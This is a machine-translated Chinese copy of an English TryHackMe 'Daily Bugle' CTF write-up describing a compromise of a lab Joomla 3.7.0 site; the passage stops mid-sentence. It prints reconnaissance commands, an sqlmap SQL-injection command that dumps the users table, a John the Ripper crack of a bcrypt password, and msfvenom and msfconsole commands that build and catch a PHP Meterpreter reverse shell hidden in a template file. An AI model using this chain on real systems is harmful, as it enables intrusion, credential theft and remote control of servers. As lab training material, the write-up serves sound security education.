<html>
<head>
<title>TryHackMe writeup: Daily Bugle</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe报道:每日号角</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-writeup-daily-bugle-87a52f234a82?source=collection_archive---------3-----------------------#2022-12-20">https://infosecwriteups.com/tryhackme-writeup-daily-bugle-87a52f234a82?source=collection_archive---------3-----------------------#2022-12-20</a></blockquote><div><div class="fc ii ij ik il im"/><div class="in io ip iq ir"><div class=""/><p id="2102" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi kp translated">《号角日报》是《蜘蛛侠》宇宙中虚构的小报。这也是TryHackMe工作人员创建的TryHackMe room的灵感来源，它要求其用户“<em class="ky">[c]通过SQLi泄露Joomla CMS帐户，练习破解哈希并利用yum </em>”提升您的权限(<a class="ae kz" href="https://tryhackme.com/room/dailybugle" rel="noopener ugc nofollow" target="_blank">“TryHackMe”2020</a>)。在本文中，我将讨论我用来获得系统初始访问权限的方法，窃取凭据以获得进一步的访问权限，然后使用权限提升方法来获得root访问权限。</p><figure class="lb lc ld le gu lf gi gj paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gi gj la"><img src="../Images/58b183a0a941c4284fefb688f467ab09.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*n1SOuc-CZgDIlpVqAcLQ7A.png"/></div></div><figcaption class="lm ln gk gi gj lo lp bd b be z dk translated">图像库:<a class="ae kz" href="https://dengeki.fandom.com/wiki/Heaven%27s_Memo_Pad?oldid=39308" rel="noopener ugc nofollow" target="_blank">邓格基维基(2022年5月18日修订)</a></figcaption></figure><h1 id="cd28" class="lq lr iu bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated">目录一览</h1><ol class=""><li id="4016" class="mo mp iu jt b ju mq jy mr kc ms kg mt kk mu ko mv mw mx my bi translated">程序</li><li id="116d" class="mo mp iu jt b ju mz jy na kc nb kg nc kk nd ko mv mw mx my bi translated">结束事项</li><li id="acb6" class="mo mp iu jt b ju mz jy na kc nb kg nc kk nd ko mv mw mx my bi translated">参考</li></ol><h1 id="fbec" class="lq lr iu bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated">程序</h1><p id="097d" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">在继续之前，我必须定义这个房间的目标。最终目标是转储名为<code class="fe nh ni nj nk b">user.txt</code>的低权限用户的文件内容，然后调用权限提升技术转储名为<code class="fe nh ni nj nk b">root.txt</code>的根文件的内容。</p><p id="008e" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我将通过编辑攻击箱上的<code class="fe nh ni nj nk b">/etc/hosts</code>文件来做准备，以包含一个名为<code class="fe nh ni nj nk b">dailybugle.thm</code>的伪域，它将指向目标系统的动态IP地址。在点击第一个任务右上角的绿色“<em class="ky">【s】start[m]machine</em>”之后，我开始探测系统，寻找获得初始访问权限的方法。</p><h2 id="59c3" class="nl lr iu bd ls nm nn dn lw no np dp ma kc nq nr me kg ns nt mi kk nu nv mm nw bi translated">探索</h2><p id="4655" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">我在我的<em class="ky">攻击框</em>中的一个网页浏览器的地址栏中输入了<code class="fe nh ni nj nk b">dailybugle.thm</code>域名，看看是否有一个网站正在运行。确实有一个网站在运行，图1显示了返回的网页:</p><figure class="lb lc ld le gu lf gi gj paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gi gj nx"><img src="../Images/bc0a3dad81e3bae79f7d8c5014ed0fa7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QWkugbD7R8yDayjOO7dZUQ.png"/></div></div><figcaption class="lm ln gk gi gj lo lp bd b be z dk translated">图1</figcaption></figure><p id="8adb" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">为了进一步探查这个系统，我使用了<a class="ae kz" href="https://nmap.org/" rel="noopener ugc nofollow" target="_blank"> nmap (n.d.) </a>来枚举系统上运行的服务，并使用<em class="ky">gobuster</em>(<a class="ae kz" href="https://github.com/OJ/gobuster" rel="noopener ugc nofollow" target="_blank">Mehlmauer等人的</a>)来查找端口80 web服务器上的任何隐藏子目录:</p><pre class="lb lc ld le gu ny nk nz bn oa ob bi"><span id="1573" class="oc lr iu nk b be od oe l of og"><strong class="nk iv">┌──(dna@deniers)-[~/dailybugle]<br/>└─$ sudo nmap -sT -A -v -Pn -p- -O -sC -oX tcp_scan.xml --max-scan-delay=5s -T4 dailybugle.thm</strong><br/>Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.<br/>Starting Nmap 7.93 ( https://nmap.org ) at [redacted]<br/>NSE: Loaded 155 scripts for scanning.<br/>NSE: Script Pre-scanning.<br/>Initiating NSE at 06:01<br/>Completed NSE at 06:01, 0.00s elapsed<br/>Initiating NSE at 06:01<br/>Completed NSE at 06:01, 0.00s elapsed<br/>Initiating NSE at 06:01<br/>Completed NSE at 06:01, 0.00s elapsed<br/>Initiating Connect Scan at 06:01<br/>Scanning dailybugle.thm [65535 ports]<br/><br/>[... snip ...]</span></pre><pre class="oh ny nk nz bn oa ob bi"><span id="33a3" class="oc lr iu nk b be od oe l of og"><strong class="nk iv">┌──(dna@deniers)-[~]<br/>└─$ gobuster dir -u http://dailybugle.thm -w ./directories.txt -x php,bak,htm,html -t 40 -k</strong><br/>===============================================================<br/>Gobuster v3.3<br/>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br/>===============================================================<br/>[+] Url:                     http://dailybugle.thm<br/>[+] Method:                  GET<br/>[+] Threads:                 40<br/>[+] Wordlist:                ./directories.txt<br/>[+] Negative Status codes:   404<br/>[+] User Agent:              gobuster/3.3<br/>[+] Extensions:              html,php,bak,htm<br/>[+] Timeout:                 10s<br/>===============================================================<br/>[redacted] Starting gobuster in directory enumeration mode<br/>===============================================================<br/><br/>[... snip ...]</span></pre><p id="2cc1" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">当这些扫描器运行时，我决定手动检查web应用程序。具体来说，我检查了主页的HTML源代码，发现在<code class="fe nh ni nj nk b">&lt;head&gt;</code>标记中嵌套了一个有趣的片段:</p><pre class="lb lc ld le gu ny nk nz bn oa ob bi"><span id="f39b" class="oc lr iu nk b be od oe l oi og">[... snip ...]<br/><br/>&lt;base href="http://dailybugle.thm/" /&gt;<br/>&lt;meta name="description" content="New York City tabloid newspaper" /&gt;<br/>&lt;meta name="generator" content="Joomla! - Open Source Content Management" /&gt;<br/>&lt;title&gt;Home&lt;/title&gt;<br/><br/>[... snip ...]</span></pre><p id="c73c" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">有一个<code class="fe nh ni nj nk b">&lt;meta&gt;</code>标签表明<code class="fe nh ni nj nk b">generator</code>就是<a class="ae kz" href="https://www.joomla.org/about-joomla.html" rel="noopener ugc nofollow" target="_blank"> Joomla！</a>(未注明)内容管理系统。知道了这一点，我就可以精心设计针对web应用程序的攻击，专门利用<em class="ky"> Joomla </em>！我应该选择攻击web服务的漏洞。在<code class="fe nh ni nj nk b">nmap</code>扫描完成后，我使用<a class="ae kz" href="http://xmlsoft.org/xslt/xsltproc.html" rel="noopener ugc nofollow" target="_blank"> xsltproc (n.d.) </a>将其XML输出转换为可读的HTML文档:</p><pre class="lb lc ld le gu ny nk nz bn oa ob bi"><span id="74c2" class="oc lr iu nk b be od oe l of og"><strong class="nk iv">┌──(dna@deniers)-[~/dailybugle]<br/>└─$ xsltproc tcp_scan.xml -o tcp_scan.html<br/>                                                                                                                                     <br/>┌──(dna@deniers)-[~/dailybugle]<br/>└─$</strong></span></pre><p id="4a85" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">图2描述了端口扫描的呈现HTML:</p><figure class="lb lc ld le gu lf gi gj paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gi gj oj"><img src="../Images/2984902b42f86ac145faedee52f63890.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uG-yQ2q9eHeX6o5trBb06g.png"/></div></div><figcaption class="lm ln gk gi gj lo lp bd b be z dk translated">图2</figcaption></figure><p id="69cf" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">目标系统正在运行以下服务:</p><ul class=""><li id="b507" class="mo mp iu jt b ju jv jy jz kc ok kg ol kk om ko on mw mx my bi translated">端口22上的一个<a class="ae kz" href="https://www.openssh.com/txt/release-7.4" rel="noopener ugc nofollow" target="_blank">OpenSSH(7.4版)</a>服务。</li><li id="e166" class="mo mp iu jt b ju mz jy na kc nb kg nc kk nd ko on mw mx my bi translated">一个<a class="ae kz" href="https://www.apachelounge.com/Changelog-2.4.html" rel="noopener ugc nofollow" target="_blank"> Apache HTTP服务(2.4.6版)</a>与<a class="ae kz" href="https://www.php.net/releases/5_6_40.php" rel="noopener ugc nofollow" target="_blank">PHP(5 . 6 . 40版)</a>在80端口。</li><li id="fbc9" class="mo mp iu jt b ju mz jy na kc nb kg nc kk nd ko on mw mx my bi translated">端口3306上的<a class="ae kz" href="https://www.mysql.com/about/" rel="noopener ugc nofollow" target="_blank"> MySQL (n.d.) </a>数据库的<a class="ae kz" href="https://mariadb.org/about/" rel="noopener ugc nofollow" target="_blank"> MariaDB (n.d.) </a> fork。</li></ul><p id="cf24" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">此外，目标系统很可能正在运行<a class="ae kz" href="https://www.centos.org/about/" rel="noopener ugc nofollow" target="_blank"> CentOS (n.d.) </a> Linux。以下是<code class="fe nh ni nj nk b">gobuster</code>扫描的结果:</p><pre class="lb lc ld le gu ny nk nz bn oa ob bi"><span id="4f3e" class="oc lr iu nk b be od oe l of og">[... snip ...]<br/><br/>/.htm                 (Status: 403) [Size: 206]<br/>/images               (Status: 301) [Size: 237] [--&gt; http://dailybugle.thm/images/]<br/>/index.php            (Status: 200) [Size: 9286]<br/>/.html                (Status: 403) [Size: 207]<br/>/media                (Status: 301) [Size: 236] [--&gt; http://dailybugle.thm/media/]<br/>/templates            (Status: 301) [Size: 240] [--&gt; http://dailybugle.thm/templates/]<br/>/modules              (Status: 301) [Size: 238] [--&gt; http://dailybugle.thm/modules/]<br/>/bin                  (Status: 301) [Size: 234] [--&gt; http://dailybugle.thm/bin/]<br/>/plugins              (Status: 301) [Size: 238] [--&gt; http://dailybugle.thm/plugins/]<br/>/includes             (Status: 301) [Size: 239] [--&gt; http://dailybugle.thm/includes/]<br/>/language             (Status: 301) [Size: 239] [--&gt; http://dailybugle.thm/language/]<br/>/components           (Status: 301) [Size: 241] [--&gt; http://dailybugle.thm/components/]<br/>/cache                (Status: 301) [Size: 236] [--&gt; http://dailybugle.thm/cache/]<br/>/libraries            (Status: 301) [Size: 240] [--&gt; http://dailybugle.thm/libraries/]<br/>/tmp                  (Status: 301) [Size: 234] [--&gt; http://dailybugle.thm/tmp/]<br/>/layouts              (Status: 301) [Size: 238] [--&gt; http://dailybugle.thm/layouts/]<br/>/administrator        (Status: 301) [Size: 244] [--&gt; http://dailybugle.thm/administrator/]<br/>/configuration.php    (Status: 200) [Size: 0]<br/>/cli                  (Status: 301) [Size: 234] [--&gt; http://dailybugle.thm/cli/]<br/>/.html                (Status: 403) [Size: 207]<br/>/.htm                 (Status: 403) [Size: 206]<br/>Progress: 515433 / 1038220 (49.65%)[ERROR] [redacted] [!] Get "http://dailybugle.thm/subrelated.bak": context deadline exceeded (Client.Timeout exceeded while awaiting headers)<br/>[ERROR] [redacted] [!] Get "http://dailybugle.thm/subrelated.htm": context deadline exceeded (Client.Timeout exceeded while awaiting headers)<br/>[ERROR] [redacted] [!] Get "http://dailybugle.thm/subtestimonials.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)<br/><br/>[... snip ...]</span></pre><p id="84f9" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">注意，为了可读性，我编辑了一些错误消息。输出显示了一些有趣的子目录，如<code class="fe nh ni nj nk b">/administrator</code>、<code class="fe nh ni nj nk b">/plugins</code>和<code class="fe nh ni nj nk b">/modules</code>，我认为它们通常与<em class="ky"> Joomla相关联！</em>内容管理系统(参见Joomla！<a class="ae kz" href="https://docs.joomla.org/Administrator_(Application)" rel="noopener ugc nofollow" target="_blank"> n.d.-b </a>，<a class="ae kz" href="https://docs.joomla.org/Module" rel="noopener ugc nofollow" target="_blank"> n.d.-c </a>)。这让我更加相信<em class="ky"> Joomla！</em>实际上是web应用程序的底层内容管理系统。</p><p id="c7db" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">进一步探测目标系统的Joomla！实例，我将使用<code class="fe nh ni nj nk b">joomscan</code>(<a class="ae kz" href="https://github.com/OWASP/joomscan" rel="noopener ugc nofollow" target="_blank">Espargham et al . n . d .</a>)实用程序来测试漏洞并收集更多相关信息。以下是<code class="fe nh ni nj nk b">joomscan</code>的节略输出:</p><pre class="lb lc ld le gu ny nk nz bn oa ob bi"><span id="d5f3" class="oc lr iu nk b be od oe l of og">[... snip ...]<br/><br/>Processing http://dailybugle.thm ...<br/><br/><br/><br/>[+] FireWall Detector<br/>[++] Firewall not detected<br/><br/>[+] Detecting Joomla Version<br/><strong class="nk iv">[++] Joomla 3.7.0</strong><br/><br/>[+] Core Joomla Vulnerability<br/>[++] Target Joomla core is not vulnerable<br/><br/>[+] Checking Directory Listing<br/>[++] directory has directory listing : <br/>http://dailybugle.thm/administrator/components<br/>http://dailybugle.thm/administrator/modules<br/>http://dailybugle.thm/administrator/templates<br/>http://dailybugle.thm/images/banners<br/><br/><br/>[+] Checking apache info/status files     <br/>[++] Readable info/status files are not found  <br/><br/>[+] admin finder  <br/>[++] <strong class="nk iv">Admin page : http://dailybugle.thm/administrator/  </strong><br/> <br/>[+] Checking robots.txt existing  <br/>[++] robots.txt is found  <br/>path : http://dailybugle.thm/robots.txt <br/> <br/>Interesting path found from robots.txt  <br/>http://dailybugle.thm/joomla/administrator/  <br/><br/>[... snip ...]                                                                                                 <br/>                                                                                                                                <br/>                                                                                                                                <br/>[+] Finding common backup files name  <br/>[++] Backup files are not found  <br/><br/>[+] Finding common log files name<br/>[++] error log is not found<br/>                                                                                                                                <br/>[+] Checking sensitive config.php.x file<br/>[++] Readable config files are not found<br/>                                                                                                                                <br/>                                                                                                                                <br/>Your Report : reports/dailybugle.thm/<br/><br/>[... snip ...]</span></pre><p id="7911" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">虽然<code class="fe nh ni nj nk b">joomscan</code>没有发现任何漏洞，但它确实报告了3.7.0版本。由此，我可以尝试基于其他安全专业人员之前的研究来手动扫描漏洞。粗略研究后，我发现<em class="ky"> Joomla！</em> 3.7.0关于其<code class="fe nh ni nj nk b">com_fields</code>模块易受SQL注入攻击(<a class="ae kz" href="https://www.exploit-db.com/exploits/42033" rel="noopener ugc nofollow" target="_blank"> Lino 2017 </a>)。</p><p id="d47a" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">在这一点上，我努力利用漏洞。我决定参考另一位安全专家在利用该漏洞方面的工作。具体来说，我参考了<a class="ae kz" href="https://muirlandoracle.co.uk/2020/02/08/daily-bugle-write-up/" rel="noopener ugc nofollow" target="_blank">“MurilandOracle”(2020)</a>关于利用SQL注入漏洞的详细信息。我想我在表达URL攻击时很挣扎；我面对的是一个如下形式的URL:</p><pre class="lb lc ld le gu ny nk nz bn oa ob bi"><span id="f350" class="oc lr iu nk b be od oe l of og">http://dailybugle.thm/index.php/2-uncategorised/1-spider-man-robs-bank</span></pre><p id="7618" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然而，<a class="ae kz" href="https://muirlandoracle.co.uk/2020/02/08/daily-bugle-write-up/" rel="noopener ugc nofollow" target="_blank">“MurilandOracle”(2020)</a>给出了下面的URL进行攻击，并指出它“喜怒无常”——意味着它在成功性上是不一致的:</p><pre class="lb lc ld le gu ny nk nz bn oa ob bi"><span id="01cb" class="oc lr iu nk b be od oe l of og">http://dailybugle.thm/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml</span></pre><h2 id="42b1" class="nl lr iu bd ls nm nn dn lw no np dp ma kc nq nr me kg ns nt mi kk nu nv mm nw bi translated">初始访问:SQL注入漏洞</h2><p id="d376" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">我将从使用<em class="ky"> sqlmap </em> ( <a class="ae kz" href="https://github.com/sqlmapproject/sqlmap" rel="noopener ugc nofollow" target="_blank"> Stampar等人的</a>)执行漏洞利用开始。这个房间的作者要求他们的用户“使用python脚本”，我认为这意味着开发他们自己的概念证明。因此，我将收集调试信息，并在将来返回到这个漏洞开发问题。然后我指示<code class="fe nh ni nj nk b">sqlmap</code>转储<code class="fe nh ni nj nk b">__users</code>数据库:</p><pre class="lb lc ld le gu ny nk nz bn oa ob bi"><span id="1c8e" class="oc lr iu nk b be od oe l of og"><strong class="nk iv">┌──(dna@deniers)-[~/dailybugle]<br/>└─$ sqlmap -u "http://dailybugle.thm/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__users' --dump -v3</strong><br/><br/>[... snip ...]<br/><br/>[12:12:02] [DEBUG] cleaning up configuration parameters<br/>[12:12:02] [DEBUG] setting the HTTP timeout<br/>[12:12:02] [DEBUG] setting the HTTP User-Agent header<br/>[12:12:02] [DEBUG] loading random HTTP User-Agent header(s) from file '/usr/share/sqlmap/data/txt/user-agents.txt'<br/>[12:12:02] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/526.3 (KHTML, like Gecko) Chrome/14.0.564.21 Safari/526.3' from file '/usr/share/sqlmap/data/txt/user-agents.txt'                           <br/>[12:12:02] [DEBUG] creating HTTP requests opener object<br/>[12:12:03] [DEBUG] setting the HTTP Referer header to the target URL<br/>[12:12:03] [DEBUG] setting the HTTP Host header to the target URL<br/>[12:12:03] [DEBUG] resolving hostname 'dailybugle.thm'<br/>[12:12:03] [INFO] testing connection to the target URL<br/>[12:12:03] [DEBUG] declared web page charset 'utf-8'<br/>[12:12:03] [DEBUG] got HTTP error code: 500 ('Internal Server Error')<br/>[12:12:03] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests<br/>you have not declared cookie(s), while server wants to set its own ('eaa83fe8b963ab08ce9ab7d4a798de05=sv4pts6c7sg...pen4oo6pt1'). Do you want to use those [Y/n]<br/><br/>[... snip ...]</span></pre><p id="35a7" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><code class="fe nh ni nj nk b">--risk</code>和<code class="fe nh ni nj nk b">--level</code>参数已被提升，因此该过程可能需要更长时间来评估SQL注入向量。我还使用了<code class="fe nh ni nj nk b">--v3</code>标志将有效载荷请求打印到控制台上，以便进一步研究。在这个过程的一段时间后，<code class="fe nh ni nj nk b">sqlmap</code>从<code class="fe nh ni nj nk b">__user</code>表中返回以下条目—如表1所示:</p><figure class="lb lc ld le gu lf gi gj paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gi gj oo"><img src="../Images/a02857bb3e8c926fad1e40fe090ce16d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*b76KBKvmF1GjglWbcE-xYw.png"/></div></div><figcaption class="lm ln gk gi gj lo lp bd b be z dk translated">表1</figcaption></figure><p id="63dd" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">记住用户凭证，我就更接近能够登录到<em class="ky"> Joomla了！</em>超级管理员区。但我首先需要知道密码。</p><h2 id="dfe9" class="nl lr iu bd ls nm nn dn lw no np dp ma kc nq nr me kg ns nt mi kk nu nv mm nw bi translated">初始访问:密码破解</h2><p id="32f8" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">据我所知，至少有两种方法可以绕过Joomla ！管理员登录表单；首先是<em class="ky">重置</em>它。<code class="fe nh ni nj nk b">__user</code>表中有一列用于在请求密码重置时保存随机字符串。</p><p id="5273" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">不幸的是，我不认为这个漏洞适用于这个版本的Joomla！，所以我将进行下一步:破解散列密码。我首先使用一个散列标识符工具(<a class="ae kz" href="https://hashes.com/en/tools/hash_identifier" rel="noopener ugc nofollow" target="_blank">Hashes.com n . d .</a>)来计算出这个版本的<em class="ky"> Joomla使用的是哪种散列！</em>用途。图3描述了网站对我正在处理的散列类型的猜测:</p><figure class="lb lc ld le gu lf gi gj paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gi gj op"><img src="../Images/677c9e20317ddcd08c1fd2883cdc1879.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*z50upMp-CofIsYG8aSHsUw.png"/></div></div><figcaption class="lm ln gk gi gj lo lp bd b be z dk translated">图3</figcaption></figure><p id="88e5" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">它确定了以下用于哈希密码的算法:<code class="fe nh ni nj nk b">bcrypt($plaintext)</code>、<em class="ky"> Blowfish </em>和<code class="fe nh ni nj nk b">bcrypt(md5($plaintext))</code>——代表bcrypt算法(<a class="ae kz" href="https://www.usenix.org/legacy/events/usenix99/provos/provos_html/node5.html" rel="noopener ugc nofollow" target="_blank">provs&amp;mazi eres 1999</a>)、Blowfish算法(<a class="ae kz" href="https://www.schneier.com/academic/archives/1994/09/description_of_a_new.html" rel="noopener ugc nofollow" target="_blank"> Schneier 1994 </a>)和另一个内嵌MD5哈希的bcrypt实例(<a class="ae kz" href="https://www.usenix.org/legacy/events/usenix99/provos/provos_html/node5.html" rel="noopener ugc nofollow" target="_blank">provs&amp;mazi eres 1999</a>)；里维斯特1992年。</p><p id="7679" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后，我将哈希输出到一个名为<code class="fe nh ni nj nk b">joomla_hash</code>的文件中，并使用<em class="ky">开膛手约翰</em> ( <a class="ae kz" href="https://www.openwall.com/john/" rel="noopener ugc nofollow" target="_blank"> Openwall n.d. </a>)来破解哈希密码:</p><pre class="lb lc ld le gu ny nk nz bn oa ob bi"><span id="56dd" class="oc lr iu nk b be od oe l of og"><strong class="nk iv">┌──(dna@deniers)-[~/dailybugle]<br/>└─$ john joomla_hash --wordlist=./rockyou.txt </strong><br/>Using default input encoding: UTF-8<br/>Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])<br/>Cost 1 (iteration count) is 1024 for all loaded hashes<br/>Will run 2 OpenMP threads<br/>Press 'q' or Ctrl-C to abort, almost any other key for status<br/>0g 0:00:00:38 0.02% 0g/s 76.68p/s 76.68c/s 76.68C/s raluca..maricar<br/>0g 0:00:04:00 0.10% 0g/s 74.66p/s 74.66c/s 74.66C/s 121981..020891<br/><strong class="nk iv">spiderman123     (?)     &lt;-- cracked password</strong><br/>1g 0:00:10:59 DONE 0.001517g/s 71.06p/s 71.06c/s 71.06C/s sweetsmile..speciala<br/>Use the "--show" option to display all of the cracked passwords reliably<br/>Session completed. <br/>                                                                                                                                <br/><strong class="nk iv">┌──(dna@deniers)-[~/dailybugle]<br/>└─$</strong></span></pre><p id="855b" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后，我将窃取的凭证输入到网站的<code class="fe nh ni nj nk b">/administrator</code>登录页面——如图4所示:</p><figure class="lb lc ld le gu lf gi gj paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gi gj oq"><img src="../Images/0991ce940cbe2f4188a1ccf63e2876e0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_kq9ozhT0Aa1gr0HnKOzdw.png"/></div></div><figcaption class="lm ln gk gi gj lo lp bd b be z dk translated">图4</figcaption></figure><p id="26f0" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我输入用户名(图4a)，密码(图4b，“蜘蛛侠”)，然后点击“登录”按钮(图4c)。这样做之后，我得到了<em class="ky"> Joomla </em>！具有超级管理员权限的控制面板—如图5所示:</p><figure class="lb lc ld le gu lf gi gj paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gi gj or"><img src="../Images/07598398780015d9528d43768096bae6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*B_5dIx6xHsmUFfdD-n8N0g.png"/></div></div><figcaption class="lm ln gk gi gj lo lp bd b be z dk translated">图5</figcaption></figure><p id="9d89" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我决定上传一个PHP web shell(<a class="ae kz" href="https://www.acunetix.com/blog/articles/introduction-web-shells-part-1/" rel="noopener ugc nofollow" target="_blank">Prodromou 2020</a>)来通过Metasploit的meter preter(<a class="ae kz" href="https://www.exploit-db.com/docs/18229" rel="noopener ugc nofollow" target="_blank">Mittal 2011</a>)发起一个反向连接。我使用下面的命令通过PHP脚本生成一个反向的Meterpreter。</p><pre class="lb lc ld le gu ny nk nz bn oa ob bi"><span id="a74c" class="oc lr iu nk b be od oe l of og"><strong class="nk iv">┌──(dna@deniers)-[~/dailybugle]<br/>└─$ sudo msfvenom -p php/meterpreter/reverse_tcp LHOST=dailybugle.thm LPORT=4444 -f raw -o meterpreter.php</strong><br/>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload<br/>[-] No arch selected, selecting arch: php from the payload<br/>No encoder specified, outputting raw payload<br/>Payload size: 1111 bytes<br/>Saved as: meterpreter.php<br/><br/>[... snip ...]</span></pre><p id="9505" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后我通过<code class="fe nh ni nj nk b">msfconsole</code>启动Metasploit，让它通过<code class="fe nh ni nj nk b">meterpreter.php</code>监听反向连接:</p><pre class="lb lc ld le gu ny nk nz bn oa ob bi"><span id="70f3" class="oc lr iu nk b be od oe l of og"><strong class="nk iv">┌──(dna@deniers)-[~/dailybugle]<br/>└─$ sudo msfconsole</strong><br/>[sudo] password for dna:<br/><br/><strong class="nk iv">msf6 &gt; use exploit/multi/handler</strong><br/>[*] Using configured payload generic/shell_reverse_tcp<br/><strong class="nk iv">msf6 exploit(multi/handler) &gt; set PAYLOAD php/meterpreter/reverse_tcp</strong><br/>PAYLOAD =&gt; php/meterpreter/reverse_tcp<br/><strong class="nk iv">msf6 exploit(multi/handler) &gt; set LHOST attacker.thm</strong><br/>LHOST =&gt; attacker.thm<br/><strong class="nk iv">msf6 exploit(multi/handler) &gt; set LPORT 4444</strong><br/>LPORT =&gt; 4444<br/><strong class="nk iv">msf6 exploit(multi/handler) &gt; exploit</strong><br/><br/>[*] Started reverse TCP handler on attacker.thm:4444<br/><br/>[... snip ...]</span></pre><p id="0145" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我安装<code class="fe nh ni nj nk b">meterpreter.php</code>的策略是修改一个<em class="ky"> Joomla </em>！包含脚本的模板。为了简洁和可读性，我将跳过这一节，但推荐一篇由<a class="ae kz" href="https://medium.com/@nickwilliams_/vulnerability-adventures-dc-3-416afe04c531" rel="noopener"> Williams (2019) </a>撰写的文章，演示了一个不同的<em class="ky">捕获旗帜</em>难题的这种方法，该难题涉及在一个<em class="ky"> Joomla </em>上安装一个PHP后门！内容管理系统。</p><p id="05bb" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">具体来说，我修改了“原恒星”模板，并添加了一个名为<code class="fe nh ni nj nk b">logging.php</code>的文件，其中将包含<code class="fe nh ni nj nk b">meterpreter.php</code>代码。为了得到一个反向shell，我需要触发<code class="fe nh ni nj nk b">logging.php</code>脚本来执行。这可以通过<a class="ae kz" href="https://curl.se/docs/faq.html" rel="noopener ugc nofollow" 